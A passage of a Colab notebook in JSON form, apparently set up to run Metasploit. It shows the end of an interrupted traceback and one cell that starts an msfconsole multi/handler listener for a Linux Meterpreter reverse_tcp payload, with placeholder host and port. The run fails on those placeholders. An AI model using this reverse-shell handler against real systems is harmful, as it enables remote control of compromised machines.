            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/google/colab/_system_commands.py\u001b[0m in \u001b[0;36m_run_command\u001b[0;34m(cmd, clear_streamed_output)\u001b[0m\n\u001b[1;32m    193\u001b[0m       \u001b[0mos\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mclose\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mchild_pty\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    194\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 195\u001b[0;31m       \u001b[0;32mreturn\u001b[0m \u001b[0m_monitor_process\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mparent_pty\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mepoll\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcmd\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mupdate_stdin_widget\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    196\u001b[0m   \u001b[0;32mfinally\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    197\u001b[0m     \u001b[0mepoll\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mclose\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/google/colab/_system_commands.py\u001b[0m in \u001b[0;36m_monitor_process\u001b[0;34m(parent_pty, epoll, p, cmd, update_stdin_widget)\u001b[0m\n\u001b[1;32m    220\u001b[0m   \u001b[0;32mwhile\u001b[0m \u001b[0;32mTrue\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    221\u001b[0m     \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 222\u001b[0;31m       \u001b[0mresult\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0m_poll_process\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mparent_pty\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mepoll\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcmd\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mdecoder\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mstate\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    223\u001b[0m       \u001b[0;32mif\u001b[0m \u001b[0mresult\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mnot\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    224\u001b[0m         \u001b[0;32mreturn\u001b[0m \u001b[0mresult\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/google/colab/_system_commands.py\u001b[0m in \u001b[0;36m_poll_process\u001b[0;34m(parent_pty, epoll, p, cmd, decoder, state)\u001b[0m\n\u001b[1;32m    267\u001b[0m   \u001b[0moutput_available\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;32mFalse\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    268\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 269\u001b[0;31m   \u001b[0mevents\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mepoll\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mpoll\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    270\u001b[0m   \u001b[0minput_events\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m[\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    271\u001b[0m   \u001b[0;32mfor\u001b[0m \u001b[0m_\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mevent\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mevents\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mKeyboardInterrupt\u001b[0m: "
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "nOs85qCb-PqL",
        "colab_type": "code",
        "outputId": "e8c125f4-7490-4112-f271-533ab325e840",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 663
        }
      },
      "source": [
        "!msfconsole -x 'use multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST <your ip>; set LPORT <your port>; set ExitOnSession false; run -j'"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "\u001b[1m\u001b[31m[-]\u001b[0m ***\n",
            "\u001b[1m\u001b[31m[-]\u001b[0m * WARNING: No database support: No database YAML file\n",
            "\u001b[1m\u001b[31m[-]\u001b[0m ***\n",
            "                                                  \n",
            "\u001b[0m\u001b[36m\u001b[37m\n",
            "                 _---------.\n",
            "             .' #######   ;.\"\n",
            "  .---,.    ;@             @@`;   .---,..\n",
            ".\" @@@@@'.,'@@            @@@@@',.'@@@@ \".\n",
            "'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;\n",
            "   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'\n",
            "     \"--'.@@@  -.@        @ ,'-   .'--\"\n",
            "          \".@' ; @       @ `.  ;'\n",
            "            |@@@@ @@@     @    .\n",
            "             ' @@@ @@   @@    ,\n",
            "              `.@@@@    @@   .\n",
            "                ',@@     @   ;           _____________\n",
            "                 (   3 C    )     /|___ / Metasploit! \\\n",
            "                 ;@'. __*__,.\"    \\|--- \\_____________/\n",
            "                  '(.,....\"/\u001b[0m\n",
            "\u001b[0m\n",
            "\n",
            "       =[ \u001b[33mmetasploit v5.0.39-dev-\u001b[0m                         ]\n",
            "+ -- --=[ 1912 exploits - 1073 auxiliary - 329 post       ]\n",
            "+ -- --=[ 545 payloads - 45 encoders - 10 nops            ]\n",
            "+ -- --=[ 3 evasion                                       ]\n",
            "\n",
            "\u001b[0m\u001b[0mpayload => linux/x86/meterpreter/reverse_tcp\n",
            "\u001b[0mLHOST => <your ip>\n",
            "\u001b[0mLPORT => <your port>\n",
            "\u001b[0mExitOnSession => false\n",
            "\u001b[0m\u001b[1m\u001b[31m[-]\u001b[0m Exploit failed: The following options failed to validate: LHOST, LPORT.\n",
            "\u001b[1m\u001b[34m[*]\u001b[0m Exploit completed, but no session was created.\n",
            "\u001b[4mmsf5\u001b[0m exploit(\u001b[1m\u001b[31mmulti/handler\u001b[0m) \u001b[0m> Interrupt: use the 'exit' command to quit\n",
            "\u001b[4mmsf5\u001b[0m exploit(\u001b[1m\u001b[31mmulti/handler\u001b[0m) \u001b[0m> Interrupt: use the 'exit' command to quit\n",
            "\u001b[4mmsf5\u001b[0m exploit(\u001b[1m\u001b[31mmulti/handler\u001b[0m) \u001b[0m> Interrupt: use the 'exit' command to quit\n",
            "\u001b[4mmsf5\u001b[0m exploit(\u001b[1m\u001b[31mmulti/handler\u001b[0m) \u001b[0m> "
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "jRGEe03IAWeZ",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        ""
      ],
      "execution_count": 0,
      "outputs": []
    }
  ]
}